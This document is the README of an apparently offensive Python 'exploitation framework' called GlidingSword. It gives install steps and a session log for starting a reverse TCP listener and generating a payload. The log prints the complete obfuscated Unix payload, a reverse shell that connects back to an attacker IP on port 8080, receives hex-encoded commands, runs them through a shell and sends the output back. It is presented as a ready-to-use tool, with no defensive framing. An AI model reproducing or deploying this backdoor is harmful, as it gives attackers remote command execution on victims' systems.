# GlidingSword
A full fledged exploitation framework written in pure python3.

## Installation
### Debian
```
$ sudo apt-get install python3 git
$ cd /opt/
$ sudo git clone https://github.com/MrSharkSpamBot/GlidingSword.git
$ cd GlidingSword/
$ sudo chmod +x GlidingSword
$ sudo cp GlidingSword /usr/bin/
```
### Arch
```
$ sudo pacman -S python git
$ cd /opt/
$ sudo git clone https://github.com/MrSharkSpamBot/GlidingSword.git
$ cd GlidingSword/
$ sudo chmod +x GlidingSword
$ sudo cp GlidingSword /usr/bin/
```

## Usage
### Running a listener
```
$ GlidingSword


	░██████╗░██╗░░░░░██╗██████╗░██╗███╗░░██╗░██████╗░
	██╔════╝░██║░░░░░██║██╔══██╗██║████╗░██║██╔════╝░
	██║░░██╗░██║░░░░░██║██║░░██║██║██╔██╗██║██║░░██╗░
	██║░░╚██╗██║░░░░░██║██║░░██║██║██║╚████║██║░░╚██╗
	╚██████╔╝███████╗██║██████╔╝██║██║░╚███║╚██████╔╝
	░╚═════╝░╚══════╝╚═╝╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝░

	░██████╗░██╗░░░░░░░██╗░█████╗░██████╗░██████╗░
	██╔════╝░██║░░██╗░░██║██╔══██╗██╔══██╗██╔══██╗
	╚█████╗░░╚██╗████╗██╔╝██║░░██║██████╔╝██║░░██║
	░╚═══██╗░░████╔═████║░██║░░██║██╔══██╗██║░░██║
	██████╔╝░░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║██████╔╝
	╚═════╝░░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚═════╝░
	Created by Mr. Shark Spam Bot.

Listeners: 1
Payloads: 3
Payload Types: 1
    
GlidingSword> help     
Command Name        Command Usage        Command Description
------------        -------------        -------------------
help                help                 Get help.
exit                exit                 Exit out of Gliding Sword.
clear               clear                Clear the screen.
payloads            payloads             Go to the payloads menu.
listeners           listeners            Go to the listeners menu.
GlidingSword> listeners
GlidingSword/Listeners> help
Command Name        Command Usage        Command Description
------------        -------------        -------------------
back                back                 Go back one menu.
help                help                 Get help.
exit                exit                 Exit out of Gliding Sword.
clear               clear                Clear the screen.
list                list                 Show all the listeners.
use                 use LISTENER         Use a listener.
GlidingSword/Listeners> list
ShadowShark
GlidingSword/Listeners> use ShadowShark
GlidingSword/Listeners/ShadowShark> help
Command Name        Command Usage        Command Description
------------        -------------        -------------------
back                back                 Go back one menu.
info                info                 Get the listener info.
options             options              Check the options and their values.
help                help                 Get help.
run                 run                  Run a listener.
exit                exit                 Exit out of Gliding Sword.
clear               clear                Clear the screen.
set                 set OPTION VALUE     Set a value for the specified option.
GlidingSword/Listeners/ShadowShark> options
Option Name        Option Value       Option Description 
-----------        ------------       ------------------ 
LHOST                                 Your IP.           
LPORT                                 The port to send the connection to. 
ENCRYPTION                            The encryption used over TCP. 
GlidingSword/Listeners/ShadowShark> set LHOST 0.0.0.0
GlidingSword/Listeners/ShadowShark> set LPORT 8080
GlidingSword/Listeners/ShadowShark> set ENCRYPTION hex
GlidingSword/Listeners/ShadowShark> options
Option Name        Option Value       Option Description 
-----------        ------------       ------------------ 
LHOST              0.0.0.0            Your IP.           
LPORT              8080               The port to send the connection to. 
ENCRYPTION         hex                The encryption used over TCP. 
GlidingSword/Listeners/ShadowShark> run

	                                             ``
	                                       ``-+yhh-
	                                    `:ohNMMMy.                  `.-`
	                                `-ohNMMMMMM:                `.+hNy-
	             ``.-:+osyyyhhhhhdddmMMMMMMMMMm---:::--..``````+dMMMo
	      `:+syhdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNMMMMMo/-`                          ./o+
	  `+ymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMms:`                 `:ohNMd:
	`oNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdo-          -+ymMMMMy-
	 :NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy/`  .+hNMMMMMNo.
	  `/+shdmymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNhmMMMMMMMNo`
	  osdhdosydNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNo`
	  sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd/`
	   ``:shNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy/.
	       ``./ohdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdhhdmNMMMMMMNd+.
	             ``.-:/+osyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdhs+-`` ````.:+yhmNMMNh+.
	                       ```.-:/+syyyhhdMMMMMMMMddddddddddddddNMMMMdo/:...``               ```.-/oys:
	                                     `mMMMMMMM``````````````.sNMMh
	                                      -mMMMMMM.               .smMy`
	                                       .yMMMMMh`                `:ys.
	                                         :yNMMMh.
	                                           .odNMm:
	                                             `-/sh:
    
[*] A reverse TCP handler on 0.0.0.0:8080 has successfully started...
```
### Generate a payload
```
$ GlidingSword


	░██████╗░██╗░░░░░██╗██████╗░██╗███╗░░██╗░██████╗░
	██╔════╝░██║░░░░░██║██╔══██╗██║████╗░██║██╔════╝░
	██║░░██╗░██║░░░░░██║██║░░██║██║██╔██╗██║██║░░██╗░
	██║░░╚██╗██║░░░░░██║██║░░██║██║██║╚████║██║░░╚██╗
	╚██████╔╝███████╗██║██████╔╝██║██║░╚███║╚██████╔╝
	░╚═════╝░╚══════╝╚═╝╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝░

	░██████╗░██╗░░░░░░░██╗░█████╗░██████╗░██████╗░
	██╔════╝░██║░░██╗░░██║██╔══██╗██╔══██╗██╔══██╗
	╚█████╗░░╚██╗████╗██╔╝██║░░██║██████╔╝██║░░██║
	░╚═══██╗░░████╔═████║░██║░░██║██╔══██╗██║░░██║
	██████╔╝░░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║██████╔╝
	╚═════╝░░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚═════╝░
	Created by Mr. Shark Spam Bot.

Listeners: 1
Payloads: 3
Payload Types: 1
    
GlidingSword> help
Command Name        Command Usage        Command Description
------------        -------------        -------------------
help                help                 Get help.
exit                exit                 Exit out of Gliding Sword.
clear               clear                Clear the screen.
payloads            payloads             Go to the payloads menu.
listeners           listeners            Go to the listeners menu.
GlidingSword> payloads
GlidingSword/Payloads> help
Command Name        Command Usage        Command Description
------------        -------------        -------------------
back                back                 Go back one menu.
help                help                 Get help.
exit                exit                 Exit out of Gliding Sword.
clear               clear                Clear the screen.
list                list                 Show all the payload types.
use                 use PAYLOAD_TYPE     Use a payload type.
GlidingSword/Payloads> list
ShadowShark
GlidingSword/Payloads> use ShadowShark
GlidingSword/Payloads/ShadowShark> list
WindowsPayload
UnixPayload
OGPayload
GlidingSword/Payloads/ShadowShark> use UnixPayload
GlidingSword/Payloads/ShadowShark/UnixPayload> help
Command Name        Command Usage        Command Description
------------        -------------        -------------------
back                back                 Go back one menu.
info                info                 Get the payload info.
options             options              Check the options and their values.
help                help                 Get help.
generate            generate             Generate a payload.
exit                exit                 Exit out of Gliding Sword.
clear               clear                Clear the screen.
set                 set OPTION VALUE     Set a value for the specified option.
GlidingSword/Payloads/ShadowShark/UnixPayload> options
Option Name        Option Value       Option Description 
-----------        ------------       ------------------ 
LHOST                                 Your IP.           
LPORT                                 The port to send the connection to. 
ENCRYPTION                            The encryption used over TCP. 
OBFUSCATE                             Whether or not to obfuscate the payload. 
GlidingSword/Payloads/ShadowShark/UnixPayload> set LHOST 192.168.1.15
GlidingSword/Payloads/ShadowShark/UnixPayload> set LPORT 8080
GlidingSword/Payloads/ShadowShark/UnixPayload> set ENCRYPTION hex
GlidingSword/Payloads/ShadowShark/UnixPayload> set OBFUSCATE yes
GlidingSword/Payloads/ShadowShark/UnixPayload> generate
[+] Successfully generated payload.

b'\x15!:\x99\xe7<\x8fLN/=\x91\xcc\xc2n\xc9f\x82\xb0[\x9cmi\xea\n\xd7\n\xc2\x86\x82\xff\xe1'
b'\xe4\x10\x18\xe1\x97\xad6{R\xbe\xab\x13\xda\x13\xba&\xfe\xa9\x83\xa8\r3e1\x03\xe3\xcf\xc2\xfa\xba(\x84'
b'\xe3\xfb\xe2\x1a\x8b\x98\xb1W\xb5\x16\x1c\xacC\xd6\x16Z\x1d%\xe6\x9e4jX\x81\x9f\xfd\xa8\x9c\xcd\x05\xcc\x0e'
b'\xe04fgK\x03\xd1\xb4\xe9j}\xcf\xf0\xe3d\xa4G\x93\x88y\x97\x9c\xect\xb2\xd18# \xaf\xb7\x1d'
b'\x8e\x86a\x90\x05A"\x1d\x89\xa6\xcbj\xd2\xa7\xd4\xba\xf5\x1e%L\xac\xcdm\xf5\xe6\x11\x0f\xb8\x04U\xdd\xd4'
# -*- coding: utf-8 -*-
"""
A full fledged Shadow Shark payload for Unix.

@author: Mr. Shark Spam Bot
"""
import socket
import subprocess
import os
import codecs
import json
import platform
import getpass

BLUE = '\033[94m'
GREEN = '\033[92m'
NORMAL = '\033[0m'

def hex_handler(text, encode=False, decode=False):
    '''Encode or decode text using hex.'''
    if encode is True:
        OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW = text.encode()
        OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW = codecs.encode(OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW, encoding='hex')
        OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW = OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW.decode()
        OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW = json.dumps(OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW)
        OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW = OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW.encode()
    if decode is True:
        OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW = json.loads(text)
        OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW = OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW.encode()
        OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW = codecs.decode(OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW, encoding='hex')
        OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW = OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW.decode()
    return OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW

NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.connect(('192.168.1.15', 8080))

while True:
    hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX = b''
    while True:
        try:
            hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX = hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX + NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.recv(1024)
            if not hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX:
                break
            if hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX[-1] == 34:
                break
        except ValueError:
            continue
    try:
        hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX = hex_handler(hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX, decode=True)
    except json.decoder.JSONDecodeError:
        continue

    if 'sudo' in hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX or 'su' in hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX:
        NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.send(hex_handler('sudo and su are not supported.', encode=True))
        continue

    if hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX == 'exit':
        NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.close()
        break

    if hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX == 'directory':
        user = getpass.getuser()
        system = platform.uname().node
        cwd = os.getcwd()
        if cwd.startswith(os.path.expanduser('~')):
            user_path = cwd.split(os.path.expanduser('~'))
            user_path = ''.join(user_path)
            prompt = f'{GREEN}{user}@{system}{NORMAL}:{BLUE}~{user_path}{NORMAL}$'
        else:
            prompt = f'{GREEN}{user}@{system}{NORMAL}:{BLUE}{cwd}{NORMAL}$'
        NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.send(hex_handler(prompt, encode=True))
        continue

    HdPpIZbyUaVQwAUGwtTgdXlMmgpDLECZsaFbvHTJdPscPPGbqlcKrRuyeOpdtOpK = subprocess.Popen(hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        stdout = HdPpIZbyUaVQwAUGwtTgdXlMmgpDLECZsaFbvHTJdPscPPGbqlcKrRuyeOpdtOpK.stdout.read().decode()
    except UnicodeDecodeError:
        NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.send(hex_handler('Could not send the data.', encode=True))
        continue
    if stdout:
        NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.send(hex_handler(stdout, encode=True))
        continue
    stderr = HdPpIZbyUaVQwAUGwtTgdXlMmgpDLECZsaFbvHTJdPscPPGbqlcKrRuyeOpdtOpK.stderr.read().decode()
    if stderr:
        NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.send(hex_handler(stderr, encode=True))
        continue

    if hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX.startswith('cd') and len(hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX.split()) >= 2:
        try:
            os.chdir(hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX[3:])
        except IOError:
            NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.send(hex_handler(f'bash: cd: {hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX[3:]}: No such file or directory', encode=True))
            continue

    NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.send(hex_handler('\n', encode=True))
b'"\x87n\x87\t3*Y\x91!E\xde\xda7\xd1\xf4C}X\xef\xa1\x1fC\x03\x94\x00!5VO\xe13'
b'E\x0f_\xc8\xe7\x9dg\xcb\x7f\xbd\xebk8Y\xfah\xca\x83\xd5\x07\x06u\xa4\xa8r\xcc\xff\x18\x1a\x11\xaay'
b'q\xe32v\xc2\x8c\x9d\xb1[xy\x92%\xed\xddW \xca\xdd\xb4?\xe4R<S\xda\xb1\xce\xb7\xa3Cu'
b'\x9e2>\xb1A\xec\x9b\xe4u\xb2\x04QQ\xe4k\xee\xfe\x15\xa0\x03\xd5\xe7\xb6\x93\xdc\xc7\xbc\x07\x90\x97\x17\xfe'
b"S+'\x07\x03\xba\xf4P\xf5\x94\x91\xbe g\n\xed\x98\xe3\xb1S\xdfh\x91\xbdV\xceO\x13i\x05\xbe\xb1"

GlidingSword/Payloads/ShadowShark/UnixPayload>
```
### General functionality
To terminate a listener use Ctrl + c. In all other cases use Ctrl + c to return to the main menu. This framework is user friendly and is not case-sensitive.

## OS support
Gliding Sword can run on any Linux system.
